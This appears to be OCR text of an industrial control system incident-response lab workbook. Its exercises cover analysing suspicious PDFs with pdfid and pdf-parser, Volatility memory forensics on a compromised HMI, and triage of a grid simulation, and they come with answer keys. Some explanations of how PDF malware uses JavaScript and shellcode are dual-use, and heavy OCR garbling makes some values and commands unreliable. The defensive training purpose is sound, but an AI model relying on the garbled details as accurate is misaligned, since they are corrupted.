> Use pdfid to analyze water_update_part2.pdf.
> Inthe command prompt, type the command:
Pdfid.py water _update_part2.pdf

*Note* Again, notice the difference from PDF1, PDF5, and PDF6. There are more End Objects and End Streams
than there are beginning Objects and Streams, there is JavaScript used, and there are EmbeddedFiles. None of
these instances by themselves are malicious, but it does raise concern. JavaScript, as an example, is commonly
used in PDFs by malware for running code on the system, or for reaching out to a web server to download an
exploit or open access to an adversary. When enough red flags go up, trust your instinct.

S$ pdfid.py water_update_part2.pdf
PDFiD 0.2.7 water_update_part2.pdf
PDF Header: %PDF-1.5
obj

endobj

stream

endstream

xref

trailer

startxref

/Page

/Encrypt

/Objstm

/3s

{JavaScript

/AA

/OpenAction
/AcroForm
/IBIG2Decode
/RichMedia

/Launch
/EmbeddedFile

/XFA

/URI

/Colors > 2424

*Note* The JavaScript usage is also potentially malicious and concerning as we shouldn’t see that in these
types of PDFs.

© 2021, Robert M. Lee Lab 4.3-5
*Answer* The multiple use of %EOFs and Javascript

2. Did the Nuclear Posture Review PDF seem malicious by first view? No

> Analyze Research Paper on Nuclear Posture Review 2010.pdf with pdf-parser.py.
> Inthe command prompt, enter:

pdf-parser.py Research\ Paper\ on\ Nuclear\ Posture\ Review\

2010.PDF > nuclear.txt

eal Terminal

S$ pdf-parser.py Research\ Paper\ on\ Nuclear\ Posture\ Review\ 2010.PDF > nuclear.txt

1 This program has not been tested with this version of Python (3.8.5)

2 Should you encounter problems, please use Python version 3.7.5
3 PDF Comment '%PDF-1.6\n'

4

50bj 10

6 Type: /EmbeddedFile

7 Referencing:

8 Contains stream

-]

10 <<

41 /Filter /FlateDecode
12 /Length 2060

13 /Type /EmbeddedFile
14 >>

is

16

17 obj 2 0

18 Type:

19 Referencing: 3 OR

20

21 <«

22 VQ

23 /Kids [3 © R]
24 /T (topmostSubform[0])

25 >>

26

27

28 obj 3 0

29 Type:

30 Referencing: 20R, 40R
31

32 <<

33 /Parent 20R
34 /Kids [4 0 R]
35 /T (Page1[0])
36 >>

© 2021, Robert M. Lee

Lab 4.3-6

re]

fm

>

=

2

>
Te

as 45 45 eo iB a5 \s 4B py ae a

45

*Answer* No the file doesn’t look malicious at first pass. While some PDFs will obviously be malicious, others
are more expertly crafted and don’t have obvious signs of being malicious without analysis with special tools.
In this case, you’d likely want to run this PDF in a Sandbox to determine if it was malicious.

3. Which Object # seemed most suspicious in the Conference PDF?? Obj 388

> Analyze Conference Information_2010 IFANS Conference on Global Affairs (1001).pdf with pdf-
parser. py.
> Inthe command prompt, enter:
pdf-parser.py Conference\ Information 2010\ IFANS\ Conference\ on\
Global\ Affairs\ \(1001\).pdf > global.txt

74 obj 388 6
75 Type:
76 Referencing:

7 <<

79 /Length 128

80 /Filter /Standard

81 /0 "(\x80ZKip\x9bg\xOb-0} 6\xOe\x8a\xO5v6. \x18\x9F *6q\x95; \x9a\x991A\xO3C)'

82 /P -3392

83 {R 3

84 /U '(\x81¢s! \xa05aecE\x9d61\\n\ x1 FA\x17\x00\ x00\ x00\ x00 \ x90 \ x80\ x00\ x00\ x00\ x00\ xO0\ x00\x00\x00\x00\x00) '
v2

86 >>

*Note* The non-standard characters in what is intended to be an English language PDF instantly stand out as
odd. Those, combined with the HEX values in the object which are very different from the rest of the PDF,
make Object 388 look as if it houses shellcode, which would be a common mechanism in PDFs to run
commands on a system and often reach out to malicious domains to pull down additional malicious code.

*Answer* Obj 388
4. How many times was /Encrypt and /JavaScript used in Conference PDF? 2 each
> Analyze Conference Information_2010 IFANS Conference on Global Affairs (1001).pdf with pdfid.py
> Inthe command prompt, enter:

pdfid.py Conference\ Information _2010\ IFANS\ Conference\ on\
Global\ Affairs\ \(1001\) .pdf

© 2021, Robert M. Lee Lab 4.3-7
pdfid.py Conference\ Information_2010\ IFANS\ Conference\ on\ Global\ Affair (1001\).pdf
DFiD 0.2.7 Con ce Information_2010 IFAN onference on Global Affairs (1001) .pdf
PDF Header: %PDF-1.6
obj
endobj

stream
endstream

xref

trailer
startxref
/Page

/Encrypt
/Objstm

{3s
/JavaScript
/AA
/OpenAction
/AcroForm
/IBIG2Decode
/RichMedia
/Launch
/EmbeddedFile
/XFA

/URI

{Colors > 2424

WNNNN

NPAN

oe

*Note* We see that JavaScript and Encrypt were both used 2 times each. It is extremely abnormal to have
encryption in a PDF that itself isn’t encrypted. JavaScript and Encryption as a combo, especially in otherwise
normal PDFs, or those found in operations like vendor manuals and training guides, is a red flag that would
need to be investigated immediately.

Exercise Takeaways

Manual PDF analysis can be difficult, especially without much understanding of PDF structures, differences in
version types, and malware authors working to obfuscate their efforts. However, manual PDF analysis through
tools such as pdfid and pdf-parser.py can help analysts to quickly identify odd-looking PDFs and those that
raise red flags through using uncommon functions or multiple uncommon functions, such as /Encrypt and
/JavaScript. There are other tools available, such as pdfextract that can extract the files and scripts in a PDF to
be viewed, hashed, and analyzed. Additionally, new functionality is being added to manual PDF analysis all the
time. As an example, Didier Stevens added the ability to use YARA files against PDFs in pdf-parser to detect
malicious behavior. The important thing isn’t knowing what every tool or command is, but understanding that
through acquiring the initial attack vector (such as a PDF), setting up a safe working environment (such as
RELICS), and looking for manual analysis tools (such as pdf-parser), it quickly becomes possible to familiarize
yourself with what good and malicious files look like and to develop additional understanding of the tools
available. This process also helps to identify why certain small defense mechanisms, such as disabling
JavaScript in PDF Readers throughout your organization, can go a long way for security. This understanding
can be shared throughout an organization for the purpose of user education and to gain better buy-in for
security practices.

© 2021, Robert M. Lee Lab 4.3-8

@) me my) @ ® @)

@ @ re,

oe

fe

om
ow

}

an ap’ aa) Th

a «a «a «> dn «4p dp op

a,

Lab 4.4 - HMI Memory Forensics _

e — Gain familiarity with Volatility
e Leverage go-to memory forensic techniques to extract key information to support incident response

*Scenario Information* At this point we are already aware of the compromise in Calistoga Refinery.
Additionally, we have seen that the adversary has moved laterally across the environment from IT into OT
networks and likely compromised the Engineering Workstation (EWS) as well as the Human Machine Interface
(HMI). Based on network analysis we saw the following files moved across the network:

- FTActivationBoost.exe
- RSLinx.exe

- Resume.doc

- Flexsvr.exe

- Beacon.exe

We also know the EWS was leveraged to interact with the safety controller likely using an infected project file.
However, we do not know if anything was done on the HMI. Though we saw the adversary try to interact with
it and consistent communications we do not know if the files referenced above or others were properly
executed on the system. The memory image of the HMI can be analyzed to identify if any of the programs were
executed and if there is any additional information that can help with our investigation.

*Note* If you get an error with Volatility try connecting your VM to the Internet and running the command
again; as an artifact of the VM sometimes an update is needed to Volatility

This exercise will utilize the RELICS VM and the viewdesigner_memdump .mem file in the ics515 >
calistogarefinery > memory folder on the Desktop. You should use Volatility to complete this lab.

© 2021, Robert M. Lee Lab 4.4-1
1. Of the malicious files observed in the network traffic (e.g. FTActivationBoost.exe, RSLinx.exe, Flexsvr.exe,
Beacon.exe, and Resume.doc) which if any have been executed on the system?

2. One of the processes is used to allow the adversary to make changes to another process and modify the
licensing software, which process does this?

3. What two malicious processes are listening for network communications?

4. Precisely when was beacon.exe executed?

© 2021, Robert M. Lee Lab 4.4-2

qe) fe @@) qe) @) @) oe, we, oy @, ey

rf,

‘eB
4s as 1s 4B is’ a8 is’

as

Task — Familiarization with the Baseline Memory

1. Of the malicious files observed in the network traffic (e.g. FTActivationBoost.exe, RSLinx.exe, Flexsvr.exe,
Beacon.exe, and Resume.doc) which if any have been executed on the system?

FTActivationBoost.exe

Flexsvr.exe

beacon.exe

> Start your RELICS VM

> Logintothe VM
> LOGIN =relics
> PASSWORD = relics

> Navigate to the memory folder for Calistoga Refinery
> Open a Terminal
> Run the following command in the terminal:
cad /home/relics/Desktop/ics515/calistogarefinery/memory/

inery/memory/

> Use Volatility to identify the running processes on the Windows system
> Run the following command in the terminal:
sudo vol -f viewdesigner _memdump.mem windows.pslist
> Identify any suspicious processes especially those matching the malicious files

© 2021, Robert M. Lee Lab 4.4-3
Fa
False

wo
P=

nd
Nw ob

o

_N

cmd.exe Ox 7 1
conhost.ex ©x85591cd8
cmd.exe 0x

conhost.exe

SearchProtocol
SearchFilterHo

FIK Imager.exe

ANN DD

>1D
ress

NNNN OR
Boe

- 2 N

a

4
2
1

ND

EventClientMul

conhost.exe
imgrd.exe

x86a8a490
ab5d20
Ox86ace030

*Note* The cmd.exe processes relate to running the command line and interacting with the system, not
abnormal in all cases but definitely interesting on a potentially compromised system. This indicates to us there

is value in analyzing the stored information in the command line in memory but we will review that in a little
bit.

*Note* Reviewing the running processes we find FTActivationBo (shortened from FTActivationBoost.exe),
beacon.exe, and flexsvr.exe. We see RSLinxNG.exe but that is different than RSLinx.exe so we could analyze it

to be sure but would not consider it immediately malicious.
*Answer* FTActivationboost.exe, Flexsvr.exe, and beacon.exe
2. One of the processes is used to allow the adversary to make changes to another process and modify the

licensing software, which process does this?
flexsvr.exe

*Note* It’s generally useful to check to see if anything was done on the command line anyway but we know
multiple instances of cmd.exe were running so it’s definitely a great choice. Volatility’s cmdline plugin will pull

out of memory whatever was done recently via the command line and print it out.

© 2021, Robert M. Lee Lab 4.4-4

®)

ey, @) cm) qe) qe) qm) qe) q@) qe) ce) (ey) ee) «ey

om)
45 ‘iB aa ap) “py ap’ <p <p’ <p ip _p

<B

ap av ap 4p ar 45 4B 4B 4B

ap

> Use Volatility to identify the command line output on the Windows system
> Run the following command in the terminal:
sudo vol -f viewdesigner_memdump.mem windows.cmdline
> Identify any suspicious activity

S$ sudo vol -f viewdesigner_memdump.mem windows.cmdLline
Volatility 3 Framework 1.0.1

Progress: 100.00 PDB scanning finished
PID Pr

ss exited?)

pHelper\U

*Note* We see the RSLingNG.exe command but nothing really stands out. We also see where

FTActivationBoost.exe ran but no other commands. However, flexsvr.exe runs and we see that the adversary
was using it to run commands, in this case it looks like the Rockwell Automation license key dongle and server

were modified for some unknown reason with an interaction with Imgrd.exe.

*Note* At this stage we won’t be coming to any complete conclusions but this is another process that we

could grab the memory or executables associated with it for the malware analysts to take a look at.

© 2021, Robert M. Lee

Lab 4.4-—5
3. What two malicious processes are listening for network communications?
Imgrd.exe

flexsvr.exe
*Note* It’s useful to know not only what is running on the system and what interactions took place but also if
there are any potential network communications to be on the look out for. Volatility’s netscan plugin helps
identify open communications to external and local systems/processes.

> Use Volatility to identify the any interesting network communications

> Run the following command in the terminal:
sudo vol -f£ viewdesigner_memdump.mem windows.netscan

> Identify any suspicious activity

IS sudo vol -f viewdesigner_memdump.mem windows .netscan
Volatility 3 Framework 1.0.1
ress: 100.00 PDB scanning finished
Proto LocalAddr LocalPort ForeignAddr

*Note* Interestingly we do not see any communications to other IP addresses such as the safety controllers
that we know the HMI is interacting with. This could indicate that the system was disconnected from the
network before the memory dump was created or otherwise interacted with instead of simply taking the
memory dump. This might drive a process change for our responders to ensure we preserve the most forensic

data possible.

*Note* As you review the communications you should be able to see that Imgrd.exe and flexsvr.exe have
open TCP ports on 27000 and 49170 respectively listening. These might represent ports that the adversary can
connect to when desired to interact with the system. This is further evidence that these two processes are the
main forensic artifacts on this system that we need to point our malware analysts too. Focusing the
investigation from hundreds of thousands of digital artifacts to just a few is a major value add.

© 2021, Robert M. Lee Lab 4.4-6

cB) @) ey ®

Pf. a we, @, oe, ne, we, ae

ce.

;
iw

ws ww ww ww ww

w

on 45 45 45 a5

a5

as

as

4. Precisely when was beacon.exe executed?
2020-09-09 17:36:38 local time

*Note* Volatility’s timeliner plugin will run all the plugins in Volatility that have timing information and put
them in chronological order. The time is based on the local system time but this is a great way to most of the
actions the adversary took on the system and find relevant information. Additionally, having the timing
information, such as when executables or commands were run, helps focus the investigation not only in
memory but also logs and network traffic around the overall incident.

> Use Volatility to identify the timeline of activity and when beacon.exe was used
> Run the following command in the terminal:
sudo vol -f viewdesigner_memdump.mem timeliner.Timeliner > test.txt
> Navigate to text.txt (stored in the memory folder under Calistoga Refinery’s folder)
> Open the file
> Cntrl-F search for beacon.exe

er_memdump.mem timeliner.Timeliner > test.txt

170 DLLList DLL Load: Process 4812 svchost.exe Loaded CLBCatQ.DLL (C:\Windows\system32\CLBCatQ.DLL)

171 DLULList DLL Load: Process 1148 svchost.exe Loaded SensApi.d1l (C:\Windows\system32\SensApi.dlL)

172 DLLList DLL Load: Process 1148 svchost.exe Loaded rasadhlp.d1l (C:\Windows\system32\rasadhip.d1ll
173 DLLList DLL Load: Process 2760 explorer.exe Loaded imagehlp.d1l (C:\Windows\system32\imagehlp.dl
174 PsList Process: 5976 beaconmac (2257938032) 2020-09-09 17:36:38.000000 N/A N/A N/A

175 PsList Process: 5976 beacon.exe (2257938032) 2020-69-09 17:36:38.000000 N/A N/A N/A

176 DLLList DLL Load: Process 896 svchost.exe Loaded pcasvc.dll (c:\windows\system32\pcasvc.d11) Siz
177 DLLList DLL Load: Process 896 svchost.exe Loaded AEPIC.d11l (c:\windows\system32\AEPIC.d11L) Size

178 DLLList DLL Load: Process 896 svchost.exe Loaded sfc.d1l (c:\windows\system32\sfc.d1l) Size 1228
179 DLLList DLL Load: Process 896 svchost.exe Loaded sfc_os.DLL (c:\windows\system32\sfc_os.DLL) Siz
180 DLLList DLL Load: Process 896 svchost.exe Loaded VERSION.d1Ll (c:\windows\system32\VERSION.d1L) Si
181 DLLList DLL Load: Process 896 svchost.exe Loaded wevtapi.dll (c:\windows\system32\wevtapi.dlL) si
182 DLLList DLL Load: Process 2760 explorer.exe Loaded DEVRTL.dll (C:\Windows\system32\DEVRTL.dlL) Si
183 DLLList DLL Load: Process 5976 beacon.exe Loaded kernel32.d1l (C:\Windows\system32\kernel32.d11)
184 DLLList DLL Load: Process 5976 beacon.exe Loaded KERNELBASE.d11 (C:\Windows\system32\KERNELBASE.
185 DLLList DLL Load: Process 5976 beacon.exe Loaded msvcrt.dll (C:\Windows\system32\msvert.d1ll) Siz

*Answer* As you search for the first instance of beacon.exe you'll find that it was run on 2020-09-09 17:36:38
local time.

Memory forensics is a powerful capability to have to review what actions were taken on a system such as
what files were running, network interactions at the system level, and create timelines of adversary activity.
Even in the memory image in this scenario, which was not full of forensic data, was useful in helping to
identify which files were successfully executed on the system helping to narrow the scope of the investigation
and more fully understand the incident and future security recommendations.

© 2021, Robert M. Lee Lab 4.4-—7
45 we 8 WwW Ww Ww Ww

a5

_ Lab 4.5 - Process Triage —

Objectives

e —_ Determine what is going on by viewing process data and control system commands

*Scenario Information* C3PO has restored their operations and the incident response procedures are largely
completed. The organization goes back into normal operations and determines they want to more closely
examine the trends in the process against current activity. The operator decides to use the Historian more
closely and Matrikon for its ability to gather information via OPC.

Control systems can exhibit normal process issues through failing equipment, improperly configured devices
or human error. Anomalous behavior of the control system may also be early signs of adversary activity in the
control systems or an actual attack on the process. Viewing these activities through the perspective of
operations can lead to earlier collaboration and communication between operations and security teams
during the discovery and triage of an event.

Exercise Prep

This lab will utilize the Windows VM, RELICS with OpenPLC running, and the PLC Kit

1. Howis a historian useful when performing a triage of an issue within a process?

2. How can some cyber threat activities appear to operations staff?

Task — Observe Normal Operations

3. Howisa historian useful when performing a triage of an issue within a process?
Open ended question

*Note* To achieve the same results as shown in this workbook, ensure the system is running with the following
setup.

> Setup OPC server
> Start the MatrikonOPC Server for Modbus.
> Select File and then import the configuration file from
Desktop\ics515\ ‘ICS515_Matrikon_Config.xml.

© 2021, Robert M. Lee Lab 4.5-1
@ import Configuration
|) > ThisPC > Desktop > Student Files - oe Search Student Files

Organize ~ New folder
Wi Desktop 9 * Name “ Date modified Type
} Downloads 5 [3) 15515 Matrikon Config 7/2/2021 3:50PM XML File
{Bj Documents # (2) ICS515_ Matrikon Explorer Config TIS/2021 10:11 AM XM File
(=) Pictures #
1) 2021-07-30-1
"additional
|| MAlarms
©) Student Files
@® OneDrive
GB This PC
B30 Objects

File name: | iC$515_Matrikon_Config

> When Prompted, select NO to export for later use

@® File Edit View Window Help
Q woe = © BH | |B [Seinewniode - HK dete

MyMatrikonOPC » Locaihost + MatrikonOPC Server for Modbus » ServerNodes Configuration >

" |iC Confirmation

You are about to replace the currently active configuration.
Do you want to export it for later use before proceeding?

Lab 4.5-2

© 2021, Robert M. Lee

=) = 2.

e

pS | eee | ee |S ee |e eS le fee | foe |

eo

ee ® ®

® ®@ ®

BR ®

oe B

ki

?

(ae ff
wo wa © w©w wD WwW Ww WwW WwW W

A wy OY

At

a, as’ 4B’ <BR’

ap

iy MatrikonOPC Server for Modbus - [Localhost\MatrikonOPC Server for Modbus\ServerConfigControl]

®, File Edit View Window Help

i €]) Back ~ () ~ St *y | (2) Spe New Node > © Delete
Location: MyMatrikonOPC » Localhost » MatrikonOPCServerforModbus » ServerNodes Configuration »
a-@ MyMatrikonOPC
a ‘3 Localhost
= Zt MatrikonOPC Server for Modbus

& B erver Nodes Configuration

IB Clickplc
IB Openpic Auto-Config!

i (8) Advanced Options

> To avoid gaps in the trends, start the Matrikon OPC Explorer from the Start Menu
i. Alternatively: Navigate to C:\Program Files
(x86)\Matrikon\OPC\Explorer\OPCExplorer.exe
> Run MatrikonOPC Explorer

*Note* Matrikon OPC Explorer is an OPC client package typically used for troubleshooting.

> Select File and Open the configuration ICS515_Matrikon_Explorer_Config.xml

File Server Group item View Help

Rt Sole @ ha Plo Bw e

Localhost '\\SANSICS-WIN'

ve v iy Localhost '\\SANSICS-WIN'
‘SRE Matrikon.OPC.Modbus. 1
GE Matrikon. OPC. Simulation. 1

‘OF RSLinx OPC Server

biG RSLinx Remote OPC Server

Network Neighborhood
Other Network Computers

@ Open Session

- ~ p > ThisPC » Desktop > Student Files

Organize + New folder

*~ Name

sk Quick access
Desktop #
4} Downloads #

(| 1CS515_Matrikon_Config
() 1CS515_Matrikon_Explorer_Config

> Verify the items displayed have values and the ‘Status’ column shows Active.

© 2021, Robert M. Lee Lab 4.5-3
>

.-—— saccms=s |
Item ID AccessPath Value Quality Timestamp Status
{8 Clickplc.... True Good, non... 07/16/202... Active
{1 Clickplc.... True Good, non... 07/16/202... Active
(i Clickplc.... True Good, non... 07/16/202.... Active
ft} Clickplc.... True Good,non... 07/16/202... Active
(> Clickplc.... True Good,non... O7/16/202... Active
(> Clickplc.... 120 Good,non... 07/16/202... Active
G2} Clickplc.... 80 Good, non... 07/16/202... Active
> Clickplc.... 80 Good, non... 07/16/202... Active
i Openpic... 30 Good, non... 07/16/202... Active

tl {%} Openplc... 30 Good, non... 07/16/202... Active

Setup residential power.

> Within the HMI, open the ‘Residential’ display.
> Ifthe ‘Reset Alarm’ button exists in the top right, click it to reset the alarm.

> ‘Close’ the reclosure.

*Note* A RED square indicates closed regardless of the line colors

Main

>

Transmission

Generation |g Distribution

Residential

Industrial

Lake House Drive

Alarms

Reclosure

Current Demand

Setup industrial power
> Open the ‘Industrial’ display
> Ifthe ‘Reset Alarm’ button exists in the top right, click it to reset the alarm
> ‘Close’ the breaker
> Ensure both refineries are off

© 2021, Robert M. Lee

Lake Pleasant Road

Open Close

Max Load

7/15/2021

Trends Login 2:36:39 PM

Lab4.5-4

MW

Mw

@

?
Zp

ty

a5 <5 <5 <5 <5

as

ap

Transmission
& Distribution

Generation Residential Industrial

7130/2021

Trends 8:40:31 PM

Refinery MW Draw

Current Output

Max Mi

> Setup transmission & distribution systems

>

Open the ‘Transmission & Distribution’ display

> If the ‘Reset Alarm’ button exists in the top right, click it to reset the alarm

>

Generation
280 MW

MW Consumption

10 %

Close the Intertie Generation

Generation Residential Industrial

Transmission & Distribution

JL

Lamda
Power House
TRANSFER BUS

Lambda
Transmission

Protection
Relay &
& _

Lamda
Substation

7/15/2021
Trends 34:13 PM
|
Intertie
Generation

oven |

Fautt | |

© 2021, Robert M. Lee

Lamda
Chee | Transmission
Breaker /

| MW Consumption

MW

> Setup the generation system
> Open the ‘Generation’ display

> If the ‘Reset Alarm’ button exists in the top right, click it to reset the alarm
> Set the ‘CT Fuel Valve Controls’ to ‘Automatic Mode’ and ‘OpenPLC’
> ‘Start’ the combustion turbine and turn ‘AVR On’
> Close the generation yard breaker
‘Ganeration ee Residential industrial Login sti iahe ath
CT Fuel Valve Controls Generation Interlock Status
wat er
@ Automatic Mode | Breaker Permissives
, © Local Click PLC @ Generator Running
30 % Open @ OpenPLe @ Trans. Breaker Closed
ie @ Trans. Protection Relay
oes Mode Warsi @ Load Present
Control Control Setpoint
ClickPLC |» Manual | 80 || % Open

Steam Turbine

Inlet Air

Combustion Turbine

@CTRunning @ AVR On = my Power Power Power
Expert Mode  ©/CT Stopped © Manual Mode On Consumption Generation Available
On Use PB's | _votage Manual Industrial 30 MW Local 80 MW Local | 280
OF = Reo Stat Residential 50) MW Intertie 0 MW Intertie [500
on Tota [80 | mw Total [80 | mw Total [70

> Review trend of stable operation
> Open the ‘Trends’ > ‘Generation’ display.

*Note* It should look similar to the following but may not be identical

Open PLC is up and running in the VM.

© 2021, Robert M. Lee Lab 4.5-6

MW
MW
MW

om

@ ce,

oe
“5 te 45 as 45 as Ae wy aw

43

a5

>

Residential Industrial

Remove residential power.

ction Relay

CT Running

Output (MW)
IB niet Air Temp (F)
BB Setpoint (Mw)

TB ate
BBE Setpoint @%

> From your student kit board turn the residential load dial all the way down and then all the way

up

> There should be a clear drop in ‘Output (MW) and ‘Valve Position (%)’ and an associated

increase in conjunction with the load increase

© 2021, Robert M. Lee

Lab 4.5-7
> Review generation values

> Open the ‘Generation’ display and note the changes to valve position and output but otherwise

everything is the same as before.

*Note* These systems are built to perform many operational functions but we have just witnessed a proper
operation of one of the functional relationships between physical system (Fuel Control Valve and Combustion

7/15/2024

Generator Breaker

Transmission Bre

= Protection Relay

CT Running

AVR On

Output (MW)
Inlet Air Temp (F)

Setpoint (MW)

Valve Position (%)

Setpoint (%)

Turbine) as well as the controls system (inter operation of PLC, HMI and OPC).

*Answer 1* A Historian, records the past activity of the physical system behavior, permissive and states. This
allows operations to compare the current process behavior with historical behavior. It is typical for a historian

to only be configured to monitor key and critical system data points but not usually all data points.

© 2021, Robert M. Lee

Lab 4.5-8

<- a

°o

=

fe

o

fe

fe

>

=

bd

>

>

>

>

>

>

a
wa Ww WwW

we Ww

wow we we Ww

45 ae «4 w G we ww Ww G w ww

45

Task — Identifying Process Issues

> With everything running as before, “Export” the Tags from the OPC server
> Open the Generation Trend screen
> Run the OPC tag exporter application

OneNote

AN

is OPC Tag Exporter

> Wait about a minute and click ‘OK” to clear the error message window

OPC Exporter

Program Error {code: 0443243)

*Note* An error such as this may give a security professional pause but these types of errors can happen all
the time and would not alert most operators to anything abnormal.

> Remove residential power

> Adjust the residential load by manipulating the dials up and down and observe the effect again

> From your student kit, push the residential reclosure Open PB, then toggle sim switch 6 to clear
the alarm and then push the reclosure Close PB.

> Watching the generation trend respond to loss of load vs response to reclosure operation
shows a dramatic difference in behavior of the trends now than before with respect to ‘Output
(MW) and ‘Valve Position (%)’. Additionally, if you navigate to the generation screen you will
see that AVR has also turned off

© 2021, Robert M. Lee Lab 4.5-9
7/15/2021
13 PM

<a

Generator Breaker

Transmission Breaker

| Protection Relay

> Attempt to fix the problem
> Open the ‘Generation’ display
> Click the AVR button to turn AVR back On

@ CT Running CG AVR On

Expert Mode
Sim 8

On = Use PB's Start | Voltage

Off=Auto Stati —| Regulation

CT Running
AVR On

Output (MW)
Inlet Air Temp (F)
Setpoint (MVV)

Valve Position (%)

Setpoint (%)

CCT Stopped © Manual Mode On

Manual
Mode
Setpoint

280

(ey

ef @

oe

@

*Note* From an operator and engineers’ perspective, this does not make sense. The function to enable
manual mode, in general, is performed by a human, not logic in the controller. The use of manual mode is not
usually a regular activity so with this, the operations team is left thinking through possibilities, such as:

© 2021, Robert M. Lee Lab 4.5-10
ww

a5 45 a as ey w a

45

45 45 a

as

e Is the controller responding properly?

e Was there any changes made to the system?
e Is communication running properly?

e Is it actually in manual mode?

e What is the root cause of this issue?

> While a team is investigating the AVR problem, it is time to reapply residential power
> Return to the ‘Residential’ display
> “Reset Alarm’
> ‘Close’ the reclosure

Reset
Alarms

Current Demand 0 MW

Reclosure

Lake House Drive

i

Open Close

Max Load 100 MW

Lake Pleasant R

> Return to AVR

> Return to the ‘Generation’ display.

> Attempt to turn AVR back On. Depending on the state of the button a couple clicks may need
to be performed

i. Ultimately the ‘Voltage Regulation’ button should read ‘Manual’ and the ‘AVR On’ light
should be a steady green

> Repeat the process to see if there is a coincidence between opening the residential reclosure

and the AVR system.

*Note* Coincidences can occur in an ICS but ultimately operations would normally be left unsettled when
issues magically resolve themselves without a clear and provable explanation. In some systems, or the system
operating is in a particular state (i.e. shutdown), the operations team may be able to manipulate the system to
explore these issues and coincidences farther. Many times, however, that luxury does not exist as
manipulating the system may be undesirable and impactful to the business. Not with all cases, but in this
example, there were no typical operational errors or bugs to explain what happened. From the physical
operations perspective, the result of turning off the AVR however would create a manual operating condition
for the generation operator requiring set point control communications with their transmission operator or
balancing authority until the issue was resolved. Extended unavailability may impact operational decision
making in regard to the unit commitments and bids into the market.

*Answer 2* Cyber threat activities can appear subtle but the physical impacts, and business impacts,
associated to those subtitles can have more devastating impacts. As defenders leaning on our operations
teams as eyes and ears to early indications of cyber events, with an awareness of how the view of these
systems could be critical in understanding the intentions of a threat.

© 2021, Robert M. Lee Lab 4.5-11
Task — Cleanup

> Examining running processes within the Windows VM, you identify opctagexporter running and you
can kill the process

er Opctagexporter 0% 9.7 MB 0 MB/s 0 Mbp:

\4s opctagexporter 0% 0.8 MB 0 MB/s 0 Mbp:

*Note* With that process stopped, you no longer see the odd behavior from a distribution reclosure
impacting AVR status at a generator.

Exercise Takeaways

In some cases, the logging and forensics available on a particular ICS device may be limited and not supper
helpful in troubleshooting operational events. Leveraging operational network activity, historian data, alarm
data, sequence of event data, endpoint process analysis, and host log reviews can all be helpful in determining
abnormal system events that are all to often simply declared misoperations without a full analysis being
performed to identify the true cause.

© 2021, Robert M. Lee Lab 4.5- 12

(wy

eo ®)

om om
wo do wb OY WY wo wD &

we Ww

J

B ap ap »

«ps

45)

Lab 5.1 -Logic Analysis for Root Cause Analysis _

e Identify what was wrong in the logic and reset the system to a good state
e Determine when the logic manipulation first resulted in manipulation in the HMI

*Scenario Information* The C3PO HMI was locked out unexpectedly after the OEM’s logic change to the Click
PLC. At first pass this does not make sense because that would imply a PLC change is impacting the HMI
negatively but is the most realistic scenario given the recent changes. Therefore, we need to analyze the logic
and the available network data to determine root cause analysis.

Exercise Prep

This exercise will use the Windows VM and the BurnerManagement.L5k and BurnerManagementinfected.L5K
files in the Student Files folder on the Desktop.

[Questions |

1. What do the tags tell us about the logic file’s purpose?

2. What is the malicious routine?

3. What is occurring in the logic?

© 2021, Robert M. Lee Lab5.1-1
Task — Determine where in the PLC Code the HMI is being commanded 5 :

1.

What do the tags tell us about the logic file’s purpose?

The logic file operates the Dosing Pumps and Pumps for the burner management system

> Using Notepad++ review BurnerManagement.L5K.

> Open Notepad++
> Open BurnerManagement.L5k
> Review the file to gain familiarity with it

[Dy new 1 - Notepad++

File Edit Search View Encoding Language Settings Tools Macro Run Plugins Window ?
I8HS 8 FAl4 eH Ac we «|B J
=jnew 1 E3|

—————

Normal text file tength:0 lines: 1

IMF

tn:1 Col:1 Pos: 1

Windows (CRLF) UTF-8 INS

File Edit Search View Encoding Language Settings Tools Macro Run Plugins Window ?

New
Open...
Open Containing Folder
Open in Default Viewer
Open Folder as Workspace...
Reload from Disk
Save As...
Save a Copy As.
ave A
Rename...
Close
Close All
Close More
Move to Recycie Bin

Load Session...
Save Session.

Ctri+R

“5

Ctrl+Alt+S

Ctri+Ww
Ctri+Shift+W

© 2021, Robert M. Lee

Lab 5.1-2

@,

@

Ce @e @) oe

@

Pe, Pe, oe, aw, ee ae,

oe

?,

(*>
we © GW © Ww Ww ww &Y Ww WwW WH WO WD WwW WO WD W

a5

File Edit Search View Encoding Language Settings Tools Macro Run Plugins Window ?
| (X Open x
+ > ThisPC > Desktop > Student Files > calistogarefinery v & Pp
Organize + New folder ira | (2)
; - ve Name . Date modified Type Size
 Guick access _ BurnerManagement.L5K _— 8/1/2021 3:41 PM Logix Designer Im...

: {Desktop Pa
Downloads +

_ BurnerManagementinfected.L5K 8/1/2021 3:41 PM Logix Designer Im...

ey Ca\Users\sansics\Desktop\ Student Files\calistogarefinery\BurnerManagement.L5K - Notepad++

File Edit Search View Encoding Language Settings Tools Macro Run Plugins Window ?
SSH. ea|*¢hh| Sel me(aalB

i a aE IRR

fe] BumerManagement.L5K £9

a ©®|2 ORB eB

(AR RE RARER RRR RRR R RE ER EKER RKB ERE ERERR RARER ERE

Import-Export
Version i= R5Logix 5000 v16.04

Imo ww

Owner Dragos Inc.
Exported := Thu Jul 16 11:08:36 2020
FOCUS IOC IIA II IOI RIOR IY
2 IE_VER := 2.7;
CONTROLLER Burner_Management_Safety System (Description := "Burner Management Safety System",
ProcessorType := "1756-L55",
Major := 16,
TimeSlice := 20,
ShareUnusedTimeSlice := 1,
CommPath := "AB ETHIP-3\10.10.20.10\Backplane\o",
RedundancyEnabled := 0,
KeepTestEditsOnSwitchOver := 0,
DataTablePadPercentage := 50,
SecurityCode := 6,
SFCExecutionControl := "“CurrentActive",
SFCRestartPosition "MostRecent",
SFCLastScan := "DontScan",
SerialNumber := 16#0019 cli4,
MatchProjectToController := No,
InhibitAutomaticFirmwareUpdate := 0)
MODULE Local (Parent := "Local",

ParentModPortid := 1,

CatalogNumber := "1756-L55",

Vendor := 1,

*Note* Every project file is different and not every OEM supports exporting the file as a text readable file.
Rockwell tends to do this though and thus we can view the project file in Notepad ++

*Note* It would be very useful to sit down with an engineer to step through what is actually happening on the

system but luckily there are some great comments and descriptions on this Burner Management Safety
System logic file for us to review.

© 2021, Robert M. Lee Lab 5.1-3
*Note* As an example we see the DP1 — DP25 values are related to the Dosing Pump. The values we see are
identical to the ones we saw earlier in the course in the network traffic; these are tags associated with the
values that are part of the control loop.

AG
